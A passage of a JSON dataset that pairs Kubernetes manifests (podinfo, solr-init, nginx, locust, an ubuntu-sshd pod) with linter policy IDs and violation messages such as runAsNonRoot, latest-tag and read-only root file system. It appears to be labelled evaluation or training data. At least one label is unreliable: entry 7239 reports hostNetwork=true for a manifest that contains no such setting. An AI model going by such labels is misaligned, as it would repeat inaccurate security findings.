Flux Emidio'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "7228",
    "manifest_path": "data/manifests/the_stack_sample/sample_2644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux Emidio'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "7229",
    "manifest_path": "data/manifests/the_stack_sample/sample_2644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux Emidio'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "7230",
    "manifest_path": "data/manifests/the_stack_sample/sample_2644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux Emidio'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "7231",
    "manifest_path": "data/manifests/the_stack_sample/sample_2644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux Emidio'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "7232",
    "manifest_path": "data/manifests/the_stack_sample/sample_2645.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: solr-init\nspec:\n  template:\n    spec:\n      containers:\n      - name: solr-init\n        image: sitecore-xc1-solr-init\n        env:\n        - name: SITECORE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-connection-string.txt\n        - name: SOLR_CORE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-core-prefix-name.txt\n        - name: COMMERCE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-connection-string.txt\n        - name: SOLR_COMMERCE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-prefix-name.txt\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7233",
    "manifest_path": "data/manifests/the_stack_sample/sample_2645.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: solr-init\nspec:\n  template:\n    spec:\n      containers:\n      - name: solr-init\n        image: sitecore-xc1-solr-init\n        env:\n        - name: SITECORE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-connection-string.txt\n        - name: SOLR_CORE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-core-prefix-name.txt\n        - name: COMMERCE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-connection-string.txt\n        - name: SOLR_COMMERCE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-prefix-name.txt\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"solr-init\" is using an invalid container image, \"sitecore-xc1-solr-init\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7234",
    "manifest_path": "data/manifests/the_stack_sample/sample_2645.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: solr-init\nspec:\n  template:\n    spec:\n      containers:\n      - name: solr-init\n        image: sitecore-xc1-solr-init\n        env:\n        - name: SITECORE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-connection-string.txt\n        - name: SOLR_CORE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-core-prefix-name.txt\n        - name: COMMERCE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-connection-string.txt\n        - name: SOLR_COMMERCE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-prefix-name.txt\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"solr-init\" does not have a read-only root file system"
  },
  {
    "id": "7235",
    "manifest_path": "data/manifests/the_stack_sample/sample_2645.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: solr-init\nspec:\n  template:\n    spec:\n      containers:\n      - name: solr-init\n        image: sitecore-xc1-solr-init\n        env:\n        - name: SITECORE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-connection-string.txt\n        - name: SOLR_CORE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-core-prefix-name.txt\n        - name: COMMERCE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-connection-string.txt\n        - name: SOLR_COMMERCE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-prefix-name.txt\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"solr-init\" is not set to runAsNonRoot"
  },
  {
    "id": "7236",
    "manifest_path": "data/manifests/the_stack_sample/sample_2645.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: solr-init\nspec:\n  template:\n    spec:\n      containers:\n      - name: solr-init\n        image: sitecore-xc1-solr-init\n        env:\n        - name: SITECORE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-connection-string.txt\n        - name: SOLR_CORE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-core-prefix-name.txt\n        - name: COMMERCE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-connection-string.txt\n        - name: SOLR_COMMERCE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-prefix-name.txt\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"solr-init\" has cpu request 0"
  },
  {
    "id": "7237",
    "manifest_path": "data/manifests/the_stack_sample/sample_2645.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: solr-init\nspec:\n  template:\n    spec:\n      containers:\n      - name: solr-init\n        image: sitecore-xc1-solr-init\n        env:\n        - name: SITECORE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-connection-string.txt\n        - name: SOLR_CORE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: sitecore-solr\n              key: sitecore-solr-core-prefix-name.txt\n        - name: COMMERCE_SOLR_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-connection-string.txt\n        - name: SOLR_COMMERCE_PREFIX_NAME\n          valueFrom:\n            secretKeyRef:\n              name: commerce-solr\n              key: commerce-solr-prefix-name.txt\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"solr-init\" has memory limit 0"
  },
  {
    "id": "7238",
    "manifest_path": "data/manifests/the_stack_sample/sample_2647.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: api\nspec:\n  selector:\n    app: api\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:api])"
  },
  {
    "id": "7239",
    "manifest_path": "data/manifests/the_stack_sample/sample_2650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\n  labels:\n    app: ubuntu-sshd\nspec:\n  containers:\n  - name: ubuntu-sshd\n    image: rastasheep/ubuntu-sshd:14.04\n    ports:\n    - containerPort: 22\n    resources:\n      requests:\n        cpu: 100m\n        memory: 20Mi\n      limits:\n        cpu: 100m\n        memory: 40Mi\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7240",
    "manifest_path": "data/manifests/the_stack_sample/sample_2650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\n  labels:\n    app: ubuntu-sshd\nspec:\n  containers:\n  - name: ubuntu-sshd\n    image: rastasheep/ubuntu-sshd:14.04\n    ports:\n    - containerPort: 22\n    resources:\n      requests:\n        cpu: 100m\n        memory: 20Mi\n      limits:\n        cpu: 100m\n        memory: 40Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ubuntu-sshd\" does not have a read-only root file system"
  },
  {
    "id": "7241",
    "manifest_path": "data/manifests/the_stack_sample/sample_2650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\n  labels:\n    app: ubuntu-sshd\nspec:\n  containers:\n  - name: ubuntu-sshd\n    image: rastasheep/ubuntu-sshd:14.04\n    ports:\n    - containerPort: 22\n    resources:\n      requests:\n        cpu: 100m\n        memory: 20Mi\n      limits:\n        cpu: 100m\n        memory: 40Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ubuntu-sshd\" is not set to runAsNonRoot"
  },
  {
    "id": "7242",
    "manifest_path": "data/manifests/the_stack_sample/sample_2650.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\n  labels:\n    app: ubuntu-sshd\nspec:\n  containers:\n  - name: ubuntu-sshd\n    image: rastasheep/ubuntu-sshd:14.04\n    ports:\n    - containerPort: 22\n    resources:\n      requests:\n        cpu: 100m\n        memory: 20Mi\n      limits:\n        cpu: 100m\n        memory: 40Mi\n",
    "policy_id": "ssh-port",
    "violation_text": "port 22 and protocol TCP in container \"ubuntu-sshd\" found"
  },
  {
    "id": "7243",
    "manifest_path": "data/manifests/the_stack_sample/sample_2651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: payment\n        image: nginx\n        securityContext:\n          capabilities:\n            drop:\n            - NET_ADMIN\n            add:\n            - NET_BIND_SERVICE\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"payment\" has DROP capabilities: [\"NET_ADMIN\"], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "7244",
    "manifest_path": "data/manifests/the_stack_sample/sample_2651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: payment\n        image: nginx\n        securityContext:\n          capabilities:\n            drop:\n            - NET_ADMIN\n            add:\n            - NET_BIND_SERVICE\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"payment\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7245",
    "manifest_path": "data/manifests/the_stack_sample/sample_2651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: payment\n        image: nginx\n        securityContext:\n          capabilities:\n            drop:\n            - NET_ADMIN\n            add:\n            - NET_BIND_SERVICE\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7246",
    "manifest_path": "data/manifests/the_stack_sample/sample_2651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: payment\n        image: nginx\n        securityContext:\n          capabilities:\n            drop:\n            - NET_ADMIN\n            add:\n            - NET_BIND_SERVICE\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"payment\" does not have a read-only root file system"
  },
  {
    "id": "7247",
    "manifest_path": "data/manifests/the_stack_sample/sample_2651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: payment\n        image: nginx\n        securityContext:\n          capabilities:\n            drop:\n            - NET_ADMIN\n            add:\n            - NET_BIND_SERVICE\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"payment\" is not set to runAsNonRoot"
  },
  {
    "id": "7248",
    "manifest_path": "data/manifests/the_stack_sample/sample_2651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: payment\n        image: nginx\n        securityContext:\n          capabilities:\n            drop:\n            - NET_ADMIN\n            add:\n            - NET_BIND_SERVICE\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"payment\" has cpu request 0"
  },
  {
    "id": "7249",
    "manifest_path": "data/manifests/the_stack_sample/sample_2651.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: payment\n        image: nginx\n        securityContext:\n          capabilities:\n            drop:\n            - NET_ADMIN\n            add:\n            - NET_BIND_SERVICE\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"payment\" has memory limit 0"
  },
  {
    "id": "7250",
    "manifest_path": "data/manifests/the_stack_sample/sample_2653.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust\n  namespace: common\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust\n  template:\n    metadata:\n      labels:\n        app: locust\n    spec:\n      containers:\n      - name: locust\n        image: locustio/locust:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - 'locustio/locust -f /home/locust/locustfile.py\n\n          '\n        volumeMounts:\n        - name: locustfile-py\n          mountPath: /home/locust/locustfile.py\n          subPath: locustfile.py\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 8089\n          protocol: TCP\n      - name: locust-exporter\n        image: nobusugi246/locust-exporter:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 1234\n          protocol: TCP\n      volumes:\n      - name: locustfile-py\n        configMap:\n          name: locustfile-py\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"locust-exporter\" is using an invalid container image, \"nobusugi246/locust-exporter:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7251",
    "manifest_path": "data/manifests/the_stack_sample/sample_2653.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust\n  namespace: common\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust\n  template:\n    metadata:\n      labels:\n        app: locust\n    spec:\n      containers:\n      - name: locust\n        image: locustio/locust:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - 'locustio/locust -f /home/locust/locustfile.py\n\n          '\n        volumeMounts:\n        - name: locustfile-py\n          mountPath: /home/locust/locustfile.py\n          subPath: locustfile.py\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 8089\n          protocol: TCP\n      - name: locust-exporter\n        image: nobusugi246/locust-exporter:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 1234\n          protocol: TCP\n      volumes:\n      - name: locustfile-py\n        configMap:\n          name: locustfile-py\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"locust\" does not have a read-only root file system"
  },
  {
    "id": "7252",
    "manifest_path": "data/manifests/the_stack_sample/sample_2653.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust\n  namespace: common\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust\n  template:\n    metadata:\n      labels:\n        app: locust\n    spec:\n      containers:\n      - name: locust\n        image: locustio/locust:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - 'locustio/locust -f /home/locust/locustfile.py\n\n          '\n        volumeMounts:\n        - name: locustfile-py\n          mountPath: /home/locust/locustfile.py\n          subPath: locustfile.py\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 8089\n          protocol: TCP\n      - name: locust-exporter\n        image: nobusugi246/locust-exporter:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 1234\n          protocol: TCP\n      volumes:\n      - name: locustfile-py\n        configMap:\n          name: locustfile-py\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"locust-exporter\" does not have a read-only root file system"
  },
  {
    "id": "7253",
    "manifest_path": "data/manifests/the_stack_sample/sample_2653.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust\n  namespace: common\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust\n  template:\n    metadata:\n      labels:\n        app: locust\n    spec:\n      containers:\n      - name: locust\n        image: locustio/locust:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - 'locustio/locust -f /home/locust/locustfile.py\n\n          '\n        volumeMounts:\n        - name: locustfile-py\n          mountPath: /home/locust/locustfile.py\n          subPath: locustfile.py\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 8089\n          protocol: TCP\n      - name: locust-exporter\n        image: nobusugi246/locust-exporter:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 1234\n          protocol: TCP\n      volumes:\n      - name: locustfile-py\n        configMap:\n          name: locustfile-py\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"locust\" is not set to runAsNonRoot"
  },
  {
    "id": "7254",
    "manifest_path": "data/manifests/the_stack_sample/sample_2653.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: locust\n  namespace: common\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: locust\n  template:\n    metadata:\n      labels:\n        app: locust\n    spec:\n      containers:\n      - name: locust\n        image: locustio/locust:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - 'locustio/locust -f /home/locust/locustfile.py\n\n          '\n        volumeMounts:\n        - name: locustfile-py\n          mountPath: /home/locust/locustfile.py\n          subPath: locustfile.py\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 8089\n          protocol: TCP\n      - name: locust-exporter\n        image: nobusugi246/locust-exporter:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 100Mi\n        ports:\n        - containerPort: 1234\n          protocol: TCP\n      volumes:\n      - name: locustfile-py\n        configMap:\n          name: locustfile-py\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"locust-exporter\" is not set to runAsNonRoot"
  },
  {
    "id": "7255",
    "manifest_path": "data/manifests/the_stack_sample/sample_2654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mars-mission1\n  labels:\n    app: mars-mission1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mars-mission1\n  template:\n    metadata:\n      labels:\n        identity_template: 'true'\n        app: mars-mission1\n    spec:\n      containers:\n      - name: mars-mission1-main\n        image: us.gcr.io/scytale-registry/aws-cli:latest\n        command:\n        - sleep\n        args:\n        - '1000000000'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mars-mission1-main\" is using an invalid container image, \"us.gcr.io/scytale-registry/aws-cli:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7256",
    "manifest_path": "data/manifests/the_stack_sample/sample_2654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mars-mission1\n  labels:\n    app: mars-mission1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mars-mission1\n  template:\n    metadata:\n      labels:\n        identity_template: 'true'\n        app: mars-mission1\n    spec:\n      containers:\n      - name: mars-mission1-main\n        image: us.gcr.io/scytale-registry/aws-cli:latest\n        command:\n        - sleep\n        args:\n        - '1000000000'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mars-mission1-main\" does not have a read-only root file system"
  },
  {
    "id": "7257",
    "manifest_path": "data/manifests/the_stack_sample/sample_2654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mars-mission1\n  labels:\n    app: mars-mission1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mars-mission1\n  template:\n    metadata:\n      labels:\n        identity_template: 'true'\n        app: mars-mission1\n    spec:\n      containers:\n      - name: mars-mission1-main\n        image: us.gcr.io/scytale-registry/aws-cli:latest\n        command:\n        - sleep\n        args:\n        - '1000000000'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mars-mission1-main\" is not set to runAsNonRoot"
  },
  {
    "id": "7258",
    "manifest_path": "data/manifests/the_stack_sample/sample_2654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mars-mission1\n  labels:\n    app: mars-mission1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mars-mission1\n  template:\n    metadata:\n      labels:\n        identity_template: 'true'\n        app: mars-mission1\n    spec:\n      containers:\n      - name: mars-mission1-main\n        image: us.gcr.io/scytale-registry/aws-cli:latest\n        command:\n        - sleep\n        args:\n        - '1000000000'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mars-mission1-main\" has cpu request 0"
  },
  {
